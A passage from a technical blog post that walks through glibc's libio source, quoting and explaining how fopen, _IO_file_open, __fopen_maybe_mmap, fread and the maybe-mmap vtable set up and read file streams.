      <span class="n">omode</span> <span class="o">=</span> <span class="n">O_WRONLY</span><span class="p">;</span>
      <span class="n">oflags</span> <span class="o">=</span> <span class="n">O_CREAT</span><span class="o">|</span><span class="n">O_TRUNC</span><span class="p">;</span>
      <span class="n">read_write</span> <span class="o">=</span> <span class="n">_IO_NO_READS</span><span class="p">;</span>
      <span class="k">break</span><span class="p">;</span>
    <span class="k">case</span> <span class="sc">&#39;a&#39;</span><span class="o">:</span>
      <span class="n">omode</span> <span class="o">=</span> <span class="n">O_WRONLY</span><span class="p">;</span>
      <span class="n">oflags</span> <span class="o">=</span> <span class="n">O_CREAT</span><span class="o">|</span><span class="n">O_APPEND</span><span class="p">;</span>
      <span class="n">read_write</span> <span class="o">=</span> <span class="n">_IO_NO_READS</span><span class="o">|</span><span class="n">_IO_IS_APPENDING</span><span class="p">;</span>
      <span class="k">break</span><span class="p">;</span>
    <span class="k">default</span><span class="o">:</span>
      <span class="n">__set_errno</span> <span class="p">(</span><span class="n">EINVAL</span><span class="p">);</span>
      <span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>
    <span class="p">}</span>
  <span class="n">last_recognized</span> <span class="o">=</span> <span class="n">mode</span><span class="p">;</span>
  <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">7</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span><span class="p">)</span>
    <span class="p">{</span>
      <span class="k">switch</span> <span class="p">(</span><span class="o">*++</span><span class="n">mode</span><span class="p">)</span>
	<span class="p">{</span>
	<span class="k">case</span> <span class="sc">&#39;\0&#39;</span><span class="o">:</span>
	  <span class="k">break</span><span class="p">;</span>
	<span class="k">case</span> <span class="sc">&#39;+&#39;</span><span class="o">:</span>
	  <span class="n">omode</span> <span class="o">=</span> <span class="n">O_RDWR</span><span class="p">;</span>
	  <span class="n">read_write</span> <span class="o">&amp;=</span> <span class="n">_IO_IS_APPENDING</span><span class="p">;</span>
	  <span class="n">last_recognized</span> <span class="o">=</span> <span class="n">mode</span><span class="p">;</span>
	  <span class="k">continue</span><span class="p">;</span>
	<span class="k">case</span> <span class="sc">&#39;x&#39;</span><span class="o">:</span>
	  <span class="n">oflags</span> <span class="o">|=</span> <span class="n">O_EXCL</span><span class="p">;</span>
	  <span class="n">last_recognized</span> <span class="o">=</span> <span class="n">mode</span><span class="p">;</span>
	  <span class="k">continue</span><span class="p">;</span>
	<span class="k">case</span> <span class="sc">&#39;b&#39;</span><span class="o">:</span>
	  <span class="n">last_recognized</span> <span class="o">=</span> <span class="n">mode</span><span class="p">;</span>
	  <span class="k">continue</span><span class="p">;</span>
	<span class="k">case</span> <span class="sc">&#39;m&#39;</span><span class="o">:</span>
	  <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_flags2</span> <span class="o">|=</span> <span class="n">_IO_FLAGS2_MMAP</span><span class="p">;</span>
	  <span class="k">continue</span><span class="p">;</span>
	<span class="k">case</span> <span class="sc">&#39;c&#39;</span><span class="o">:</span>
	  <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_flags2</span> <span class="o">|=</span> <span class="n">_IO_FLAGS2_NOTCANCEL</span><span class="p">;</span>
	  <span class="k">continue</span><span class="p">;</span>
	<span class="k">case</span> <span class="sc">&#39;e&#39;</span><span class="o">:</span>
	  <span class="n">oflags</span> <span class="o">|=</span> <span class="n">O_CLOEXEC</span><span class="p">;</span>
	  <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_flags2</span> <span class="o">|=</span> <span class="n">_IO_FLAGS2_CLOEXEC</span><span class="p">;</span>
	  <span class="k">continue</span><span class="p">;</span>
	<span class="k">default</span><span class="o">:</span>
	  <span class="cm">/* Ignore.  */</span>
	  <span class="k">continue</span><span class="p">;</span>
	<span class="p">}</span>
      <span class="k">break</span><span class="p">;</span>
    <span class="p">}</span>

  <span class="n">result</span> <span class="o">=</span> <span class="n">_IO_file_open</span> <span class="p">(</span><span class="n">fp</span><span class="p">,</span> <span class="n">filename</span><span class="p">,</span> <span class="n">omode</span><span class="o">|</span><span class="n">oflags</span><span class="p">,</span> <span class="n">oprot</span><span class="p">,</span> <span class="n">read_write</span><span class="p">,</span>
			  <span class="n">is32not64</span><span class="p">);</span>

  <span class="k">if</span> <span class="p">(</span><span class="n">result</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span>
    <span class="p">{</span>
      <span class="cm">/* Test whether the mode string specifies the conversion.  */</span>
      <span class="n">cs</span> <span class="o">=</span> <span class="n">strstr</span> <span class="p">(</span><span class="n">last_recognized</span> <span class="o">+</span> <span class="mi">1</span><span class="p">,</span> <span class="s">&#34;,ccs=&#34;</span><span class="p">);</span>
      <span class="k">if</span> <span class="p">(</span><span class="n">cs</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span>
	<span class="p">{</span>
	  <span class="cm">/* Yep.  Load the appropriate conversions and set the orientation
</span><span class="cm">	     to wide.  */</span>
	  <span class="k">struct</span> <span class="n">gconv_fcts</span> <span class="n">fcts</span><span class="p">;</span>
	  <span class="k">struct</span> <span class="n">_IO_codecvt</span> <span class="o">*</span><span class="n">cc</span><span class="p">;</span>
	  <span class="kt">char</span> <span class="o">*</span><span class="n">endp</span> <span class="o">=</span> <span class="n">__strchrnul</span> <span class="p">(</span><span class="n">cs</span> <span class="o">+</span> <span class="mi">5</span><span class="p">,</span> <span class="sc">&#39;,&#39;</span><span class="p">);</span>
	  <span class="kt">char</span> <span class="o">*</span><span class="n">ccs</span> <span class="o">=</span> <span class="n">malloc</span> <span class="p">(</span><span class="n">endp</span> <span class="o">-</span> <span class="p">(</span><span class="n">cs</span> <span class="o">+</span> <span class="mi">5</span><span class="p">)</span> <span class="o">+</span> <span class="mi">3</span><span class="p">);</span>

	  <span class="k">if</span> <span class="p">(</span><span class="n">ccs</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span>
	    <span class="p">{</span>
	      <span class="kt">int</span> <span class="n">malloc_err</span> <span class="o">=</span> <span class="n">errno</span><span class="p">;</span>  <span class="cm">/* Whatever malloc failed with.  */</span>
	      <span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="n">_IO_file_close_it</span> <span class="p">(</span><span class="n">fp</span><span class="p">);</span>
	      <span class="n">__set_errno</span> <span class="p">(</span><span class="n">malloc_err</span><span class="p">);</span>
	      <span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>
	    <span class="p">}</span>

	  <span class="o">*</span><span class="p">((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span> <span class="n">__mempcpy</span> <span class="p">(</span><span class="n">ccs</span><span class="p">,</span> <span class="n">cs</span> <span class="o">+</span> <span class="mi">5</span><span class="p">,</span> <span class="n">endp</span> <span class="o">-</span> <span class="p">(</span><span class="n">cs</span> <span class="o">+</span> <span class="mi">5</span><span class="p">)))</span> <span class="o">=</span> <span class="sc">&#39;\0&#39;</span><span class="p">;</span>
	  <span class="n">strip</span> <span class="p">(</span><span class="n">ccs</span><span class="p">,</span> <span class="n">ccs</span><span class="p">);</span>

	  <span class="k">if</span> <span class="p">(</span><span class="n">__wcsmbs_named_conv</span> <span class="p">(</span><span class="o">&amp;</span><span class="n">fcts</span><span class="p">,</span> <span class="n">ccs</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">==</span> <span class="sc">&#39;\0&#39;</span>
				   <span class="o">?</span> <span class="n">upstr</span> <span class="p">(</span><span class="n">ccs</span><span class="p">,</span> <span class="n">cs</span> <span class="o">+</span> <span class="mi">5</span><span class="p">)</span> <span class="o">:</span> <span class="n">ccs</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span>
	    <span class="p">{</span>
	      <span class="cm">/* Something went wrong, we cannot load the conversion modules.
</span><span class="cm">		 This means we cannot proceed since the user explicitly asked
</span><span class="cm">		 for these.  */</span>
	      <span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="n">_IO_file_close_it</span> <span class="p">(</span><span class="n">fp</span><span class="p">);</span>
	      <span class="n">free</span> <span class="p">(</span><span class="n">ccs</span><span class="p">);</span>
	      <span class="n">__set_errno</span> <span class="p">(</span><span class="n">EINVAL</span><span class="p">);</span>
	      <span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>
	    <span class="p">}</span>

	  <span class="n">free</span> <span class="p">(</span><span class="n">ccs</span><span class="p">);</span>

	  <span class="n">assert</span> <span class="p">(</span><span class="n">fcts</span><span class="p">.</span><span class="n">towc_nsteps</span> <span class="o">==</span> <span class="mi">1</span><span class="p">);</span>
	  <span class="n">assert</span> <span class="p">(</span><span class="n">fcts</span><span class="p">.</span><span class="n">tomb_nsteps</span> <span class="o">==</span> <span class="mi">1</span><span class="p">);</span>

	  <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_wide_data</span><span class="o">-&gt;</span><span class="n">_IO_read_ptr</span> <span class="o">=</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_wide_data</span><span class="o">-&gt;</span><span class="n">_IO_read_end</span><span class="p">;</span>
	  <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_wide_data</span><span class="o">-&gt;</span><span class="n">_IO_write_ptr</span> <span class="o">=</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_wide_data</span><span class="o">-&gt;</span><span class="n">_IO_write_base</span><span class="p">;</span>

	  <span class="cm">/* Clear the state.  We start all over again.  */</span>
	  <span class="n">memset</span> <span class="p">(</span><span class="o">&amp;</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_wide_data</span><span class="o">-&gt;</span><span class="n">_IO_state</span><span class="p">,</span> <span class="sc">&#39;\0&#39;</span><span class="p">,</span> <span class="k">sizeof</span> <span class="p">(</span><span class="n">__mbstate_t</span><span class="p">));</span>
	  <span class="n">memset</span> <span class="p">(</span><span class="o">&amp;</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_wide_data</span><span class="o">-&gt;</span><span class="n">_IO_last_state</span><span class="p">,</span> <span class="sc">&#39;\0&#39;</span><span class="p">,</span> <span class="k">sizeof</span> <span class="p">(</span><span class="n">__mbstate_t</span><span class="p">));</span>

	  <span class="n">cc</span> <span class="o">=</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_codecvt</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_wide_data</span><span class="o">-&gt;</span><span class="n">_codecvt</span><span class="p">;</span>

	  <span class="n">cc</span><span class="o">-&gt;</span><span class="n">__cd_in</span><span class="p">.</span><span class="n">step</span> <span class="o">=</span> <span class="n">fcts</span><span class="p">.</span><span class="n">towc</span><span class="p">;</span>

	  <span class="n">cc</span><span class="o">-&gt;</span><span class="n">__cd_in</span><span class="p">.</span><span class="n">step_data</span><span class="p">.</span><span class="n">__invocation_counter</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
	  <span class="n">cc</span><span class="o">-&gt;</span><span class="n">__cd_in</span><span class="p">.</span><span class="n">step_data</span><span class="p">.</span><span class="n">__internal_use</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
	  <span class="n">cc</span><span class="o">-&gt;</span><span class="n">__cd_in</span><span class="p">.</span><span class="n">step_data</span><span class="p">.</span><span class="n">__flags</span> <span class="o">=</span> <span class="n">__GCONV_IS_LAST</span><span class="p">;</span>
	  <span class="n">cc</span><span class="o">-&gt;</span><span class="n">__cd_in</span><span class="p">.</span><span class="n">step_data</span><span class="p">.</span><span class="n">__statep</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">result</span><span class="o">-&gt;</span><span class="n">_wide_data</span><span class="o">-&gt;</span><span class="n">_IO_state</span><span class="p">;</span>

	  <span class="n">cc</span><span class="o">-&gt;</span><span class="n">__cd_out</span><span class="p">.</span><span class="n">step</span> <span class="o">=</span> <span class="n">fcts</span><span class="p">.</span><span class="n">tomb</span><span class="p">;</span>

	  <span class="n">cc</span><span class="o">-&gt;</span><span class="n">__cd_out</span><span class="p">.</span><span class="n">step_data</span><span class="p">.</span><span class="n">__invocation_counter</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
	  <span class="n">cc</span><span class="o">-&gt;</span><span class="n">__cd_out</span><span class="p">.</span><span class="n">step_data</span><span class="p">.</span><span class="n">__internal_use</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
	  <span class="n">cc</span><span class="o">-&gt;</span><span class="n">__cd_out</span><span class="p">.</span><span class="n">step_data</span><span class="p">.</span><span class="n">__flags</span> <span class="o">=</span> <span class="n">__GCONV_IS_LAST</span> <span class="o">|</span> <span class="n">__GCONV_TRANSLIT</span><span class="p">;</span>
	  <span class="n">cc</span><span class="o">-&gt;</span><span class="n">__cd_out</span><span class="p">.</span><span class="n">step_data</span><span class="p">.</span><span class="n">__statep</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">result</span><span class="o">-&gt;</span><span class="n">_wide_data</span><span class="o">-&gt;</span><span class="n">_IO_state</span><span class="p">;</span>

	  <span class="cm">/* From now on use the wide character callback functions.  */</span>
	  <span class="n">_IO_JUMPS_FILE_plus</span> <span class="p">(</span><span class="n">fp</span><span class="p">)</span> <span class="o">=</span> <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_wide_data</span><span class="o">-&gt;</span><span class="n">_wide_vtable</span><span class="p">;</span>

	  <span class="cm">/* Set the mode now.  */</span>
	  <span class="n">result</span><span class="o">-&gt;</span><span class="n">_mode</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
	<span class="p">}</span>
    <span class="p">}</span>

  <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
<span class="p">}</span>
<span class="n">libc_hidden_ver</span> <span class="p">(</span><span class="n">_IO_new_file_fopen</span><span class="p">,</span> <span class="n">_IO_file_fopen</span><span class="p">)</span>
</code></pre></div><p>That&rsquo;s a pretty huge function but most of it is just parsing and handling of a specific encoding for the file. First it checks if the file is already open then it parses the mode and once it&rsquo;s done it calls <code>_IO_file_open</code> with the right flags. Then is the file requires a specific encoding it intitializes <code>_wide_data</code> and so on to properly handle it. Let&rsquo;s take a look at the  <code>_IO_file_open</code> function:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="c1">// https://elixir.bootlin.com/glibc/glibc-2.36/source/libio/fileops.c#L180
</span><span class="c1"></span>
<span class="n">FILE</span> <span class="o">*</span>
<span class="nf">_IO_file_open</span> <span class="p">(</span><span class="n">FILE</span> <span class="o">*</span><span class="n">fp</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">filename</span><span class="p">,</span> <span class="kt">int</span> <span class="n">posix_mode</span><span class="p">,</span> <span class="kt">int</span> <span class="n">prot</span><span class="p">,</span>
	       <span class="kt">int</span> <span class="n">read_write</span><span class="p">,</span> <span class="kt">int</span> <span class="n">is32not64</span><span class="p">)</span>
<span class="p">{</span>
  <span class="kt">int</span> <span class="n">fdesc</span><span class="p">;</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">__glibc_unlikely</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_flags2</span> <span class="o">&amp;</span> <span class="n">_IO_FLAGS2_NOTCANCEL</span><span class="p">))</span>
    <span class="n">fdesc</span> <span class="o">=</span> <span class="n">__open_nocancel</span> <span class="p">(</span><span class="n">filename</span><span class="p">,</span>
			     <span class="n">posix_mode</span> <span class="o">|</span> <span class="p">(</span><span class="n">is32not64</span> <span class="o">?</span> <span class="mi">0</span> <span class="o">:</span> <span class="n">O_LARGEFILE</span><span class="p">),</span> <span class="n">prot</span><span class="p">);</span>
  <span class="k">else</span>
    <span class="n">fdesc</span> <span class="o">=</span> <span class="n">__open</span> <span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="n">posix_mode</span> <span class="o">|</span> <span class="p">(</span><span class="n">is32not64</span> <span class="o">?</span> <span class="mi">0</span> <span class="o">:</span> <span class="n">O_LARGEFILE</span><span class="p">),</span> <span class="n">prot</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">fdesc</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span>
    <span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>
  <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_fileno</span> <span class="o">=</span> <span class="n">fdesc</span><span class="p">;</span>
  <span class="n">_IO_mask_flags</span> <span class="p">(</span><span class="n">fp</span><span class="p">,</span> <span class="n">read_write</span><span class="p">,</span><span class="n">_IO_NO_READS</span><span class="o">+</span><span class="n">_IO_NO_WRITES</span><span class="o">+</span><span class="n">_IO_IS_APPENDING</span><span class="p">);</span>
  <span class="cm">/* For append mode, send the file offset to the end of the file.  Don&#39;t
</span><span class="cm">     update the offset cache though, since the file handle is not active.  */</span>
  <span class="k">if</span> <span class="p">((</span><span class="n">read_write</span> <span class="o">&amp;</span> <span class="p">(</span><span class="n">_IO_IS_APPENDING</span> <span class="o">|</span> <span class="n">_IO_NO_READS</span><span class="p">))</span>
      <span class="o">==</span> <span class="p">(</span><span class="n">_IO_IS_APPENDING</span> <span class="o">|</span> <span class="n">_IO_NO_READS</span><span class="p">))</span>
    <span class="p">{</span>
      <span class="n">off64_t</span> <span class="n">new_pos</span> <span class="o">=</span> <span class="n">_IO_SYSSEEK</span> <span class="p">(</span><span class="n">fp</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">_IO_seek_end</span><span class="p">);</span>
      <span class="k">if</span> <span class="p">(</span><span class="n">new_pos</span> <span class="o">==</span> <span class="n">_IO_pos_BAD</span> <span class="o">&amp;&amp;</span> <span class="n">errno</span> <span class="o">!=</span> <span class="n">ESPIPE</span><span class="p">)</span>
	<span class="p">{</span>
	  <span class="n">__close_nocancel</span> <span class="p">(</span><span class="n">fdesc</span><span class="p">);</span>
	  <span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>
	<span class="p">}</span>
    <span class="p">}</span>
  <span class="n">_IO_link_in</span> <span class="p">((</span><span class="k">struct</span> <span class="n">_IO_FILE_plus</span> <span class="o">*</span><span class="p">)</span> <span class="n">fp</span><span class="p">);</span>
  <span class="k">return</span> <span class="n">fp</span><span class="p">;</span>
<span class="p">}</span>
<span class="n">libc_hidden_def</span> <span class="p">(</span><span class="n">_IO_file_open</span><span class="p">)</span>
</code></pre></div><p>If the mode doesn&rsquo;t allow the open process to be a cancellation point it calls <code>__open_nocancel</code>, else it calls <code>__open</code>. When the file is open, it initializes flags, file descriptor (fileno) and links the actual file pointer to the single linked list that stores every file stream (if that&rsquo;s not already the case).</p>
<p>Then we&rsquo;re back into <code>__fopen_internal</code> to call <code>__fopen_maybe_mmap</code> on the newly open file:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="c1">// https://elixir.bootlin.com/glibc/glibc-2.36/source/libio/iofopen.c#L34
</span><span class="c1"></span>
<span class="n">FILE</span> <span class="o">*</span>
<span class="nf">__fopen_maybe_mmap</span> <span class="p">(</span><span class="n">FILE</span> <span class="o">*</span><span class="n">fp</span><span class="p">)</span>
<span class="p">{</span>
<span class="cp">#if _G_HAVE_MMAP
</span><span class="cp"></span>  <span class="k">if</span> <span class="p">((</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_flags2</span> <span class="o">&amp;</span> <span class="n">_IO_FLAGS2_MMAP</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_flags</span> <span class="o">&amp;</span> <span class="n">_IO_NO_WRITES</span><span class="p">))</span>
    <span class="p">{</span>
      <span class="cm">/* Since this is read-only, we might be able to mmap the contents
</span><span class="cm">	 directly.  We delay the decision until the first read attempt by
</span><span class="cm">	 giving it a jump table containing functions that choose mmap or
</span><span class="cm">	 vanilla file operations and reset the jump table accordingly.  */</span>

      <span class="k">if</span> <span class="p">(</span><span class="n">fp</span><span class="o">-&gt;</span><span class="n">_mode</span> <span class="o">&lt;=</span> <span class="mi">0</span><span class="p">)</span>
	<span class="n">_IO_JUMPS_FILE_plus</span> <span class="p">(</span><span class="n">fp</span><span class="p">)</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">_IO_file_jumps_maybe_mmap</span><span class="p">;</span>
      <span class="k">else</span>
	<span class="n">_IO_JUMPS_FILE_plus</span> <span class="p">(</span><span class="n">fp</span><span class="p">)</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">_IO_wfile_jumps_maybe_mmap</span><span class="p">;</span>
      <span class="n">fp</span><span class="o">-&gt;</span><span class="n">_wide_data</span><span class="o">-&gt;</span><span class="n">_wide_vtable</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">_IO_wfile_jumps_maybe_mmap</span><span class="p">;</span>
    <span class="p">}</span>
<span class="cp">#endif
</span><span class="cp"></span>  <span class="k">return</span> <span class="n">fp</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div><p>I think the comment is enough explicit, once <code>__fopen_maybe_mmap</code> is called the <code>fp</code> is returned given the file descriptor has properly been allocated, initialized and that the file is open. Else it means that there are some errors, then the <code>fp</code> is unlinked from the single linked that stores every file stream, and the <code>locked_FILE</code> is freed, returning <code>NULL</code> indicating an error.</p>
<p>That&rsquo;s basically how <code>fopen</code> works !</p>
<div class="gblog-post__anchorwrap">
    <h1 id="fread">
        fread
        <a data-clipboard-text="https://nasm.re/posts/filestream/#fread" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor fread" href="#fread">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h1>
</div>
<p>Once a <code>_IO_FILE</code> structure has been initialized and linked into the <code>_IO_list_all</code> single linked list, several operations can occur. A basic primitive would be to read data from a file, that&rsquo;s what fread does with the use of certain fields of <code>_IO_FILE</code>.</p>
<p>Here is a basic description of what <code>fread</code> does, the schema comes from <a
  class="gblog-markdown__link"
  href="https://ray-cp.github.io/archivers/IO_FILE_fread_analysis"
  
  >the incredible article of raycp</a
>.</p>
<p align="center" width="100%">
    fread algorithm.<br>
    <img width="80%" src="/fread.png">
    </br>
</p>
<p>According to the man: &ldquo;The function fread() reads nmemb items of data, each size bytes long, from the stream pointed to by stream, storing them at the location given by ptr.&rdquo;. Now let&rsquo;s dig deeper within the code. <code>fread</code> is defined there:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="c1">// https://elixir.bootlin.com/glibc/latest/source/libio/iofread.c#L30
</span><span class="c1"></span>
<span class="n">size_t</span>
<span class="nf">_IO_fread</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="n">buf</span><span class="p">,</span> <span class="n">size_t</span> <span class="n">size</span><span class="p">,</span> <span class="n">size_t</span> <span class="n">count</span><span class="p">,</span> <span class="n">FILE</span> <span class="o">*</span><span class="n">fp</span><span class="p">)</span>
<span class="p">{</span>
  <span class="n">size_t</span> <span class="n">bytes_requested</span> <span class="o">=</span> <span class="n">size</span> <span class="o">*</span> <span class="n">count</span><span class="p">;</span>
  <span class="n">size_t</span> <span class="n">bytes_read</span><span class="p">;</span>
  <span class="n">CHECK_FILE</span> <span class="p">(</span><span class="n">fp</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">bytes_requested</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
  <span class="n">_IO_acquire_lock</span> <span class="p">(</span><span class="n">fp</span><span class="p">);</span>
  <span class="n">bytes_read</span> <span class="o">=</span> <span class="n">_IO_sgetn</span> <span class="p">(</span><span class="n">fp</span><span class="p">,</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span> <span class="n">buf</span><span class="p">,</span> <span class="n">bytes_requested</span><span class="p">);</span>
  <span class="n">_IO_release_lock</span> <span class="p">(</span><span class="n">fp</span><span class="p">);</span>
  <span class="k">return</span> <span class="n">bytes_requested</span> <span class="o">==</span> <span class="n">bytes_read</span> <span class="o">?</span> <span class="nl">count</span> <span class="p">:</span> <span class="n">bytes_read</span> <span class="o">/</span> <span class="n">size</span><span class="p">;</span>
<span class="p">}</span>
<span class="n">libc_hidden_def</span> <span class="p">(</span><span class="n">_IO_fread</span><span class="p">)</span>
</code></pre></div><p>If the amount of requested bytes is null, zero is returned. <code>CHECK_FILE</code> checks (if <code>IO_DEBUG</code> is enabled) if <code>fp</code> exists and if <code>fp-&gt;flags</code> is properely structured:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="c1">// https://elixir.bootlin.com/glibc/latest/source/libio/libioP.h#L866
</span><span class="c1"></span>
<span class="cp">#ifdef IO_DEBUG
</span><span class="cp"># define CHECK_FILE(FILE, RET) do {				\
</span><span class="cp">    if ((FILE) == NULL						\
</span><span class="cp">	|| ((FILE)-&gt;_flags &amp; _IO_MAGIC_MASK) != _IO_MAGIC)	\
</span><span class="cp">      {								\
</span><span class="cp">	__set_errno (EINVAL);					\
</span><span class="cp">	return RET;						\
</span><span class="cp">      }								\
</span><span class="cp">  } while (0)
</span><span class="cp">#else
</span><span class="cp"># define CHECK_FILE(FILE, RET) do { } while (0)
</span><span class="cp">#endif
</span></code></pre></div><p>Then <code>_IO_sgetn</code> is called:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="c1">// https://elixir.bootlin.com/glibc/latest/source/libio/genops.c#L408
</span><span class="c1"></span>
<span class="n">size_t</span>
<span class="nf">_IO_sgetn</span> <span class="p">(</span><span class="n">FILE</span> <span class="o">*</span><span class="n">fp</span><span class="p">,</span> <span class="kt">void</span> <span class="o">*</span><span class="n">data</span><span class="p">,</span> <span class="n">size_t</span> <span class="n">n</span><span class="p">)</span>
<span class="p">{</span>
  <span class="cm">/* FIXME handle putback buffer here! */</span>
  <span class="k">return</span> <span class="n">_IO_XSGETN</span> <span class="p">(</span><span class="n">fp</span><span class="p">,</span> <span class="n">data</span><span class="p">,</span> <span class="n">n</span><span class="p">);</span>
<span class="p">}</span>
<span class="n">libc_hidden_def</span> <span class="p">(</span><span class="n">_IO_sgetn</span><span class="p">)</span>
</code></pre></div><p>When this is the first time <code>_IO_sgetn</code> is called, on most of the platforms (the one which support <code>mmap</code>) the <code>vtable</code> is initialized to <code>_IO_file_jumps_maybe_mmap</code>:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="c1">// https://elixir.bootlin.com/glibc/latest/source/libio/fileops.c#L1481
</span><span class="c1"></span>
<span class="k">const</span> <span class="k">struct</span> <span class="n">_IO_jump_t</span> <span class="n">_IO_file_jumps_maybe_mmap</span> <span class="n">libio_vtable</span> <span class="o">=</span>
<span class="p">{</span>
  <span class="n">JUMP_INIT_DUMMY</span><span class="p">,</span>
  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">finish</span><span class="p">,</span> <span class="n">_IO_file_finish</span><span class="p">),</span>
  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">overflow</span><span class="p">,</span> <span class="n">_IO_file_overflow</span><span class="p">),</span>
  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">underflow</span><span class="p">,</span> <span class="n">_IO_file_underflow_maybe_mmap</span><span class="p">),</span>
  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">uflow</span><span class="p">,</span> <span class="n">_IO_default_uflow</span><span class="p">),</span>
  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">pbackfail</span><span class="p">,</span> <span class="n">_IO_default_pbackfail</span><span class="p">),</span>
  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">xsputn</span><span class="p">,</span> <span class="n">_IO_new_file_xsputn</span><span class="p">),</span>
  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">xsgetn</span><span class="p">,</span> <span class="n">_IO_file_xsgetn_maybe_mmap</span><span class="p">),</span>
  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">seekoff</span><span class="p">,</span> <span class="n">_IO_file_seekoff_maybe_mmap</span><span class="p">),</span>
  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">seekpos</span><span class="p">,</span> <span class="n">_IO_default_seekpos</span><span class="p">),</span>
  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">setbuf</span><span class="p">,</span> <span class="p">(</span><span class="n">_IO_setbuf_t</span><span class="p">)</span> <span class="n">_IO_file_setbuf_mmap</span><span class="p">),</span>
  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">sync</span><span class="p">,</span> <span class="n">_IO_new_file_sync</span><span class="p">),</span>
  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">doallocate</span><span class="p">,</span> <span class="n">_IO_file_doallocate</span><span class="p">),</span>
  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">read</span><span class="p">,</span> <span class="n">_IO_file_read</span><span class="p">),</span>
  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">write</span><span class="p">,</span> <span class="n">_IO_new_file_write</span><span class="p">),</span>
  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">seek</span><span class="p">,</span> <span class="n">_IO_file_seek</span><span class="p">),</span>
  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">close</span><span class="p">,</span> <span class="n">_IO_file_close</span><span class="p">),</span>
  <span class="n">JUMP_INIT</span><span class="p">(</span><span class="n">stat</span><span class="p">,</span> <span class="n">_IO_file_stat</span><span class="p">),</span>
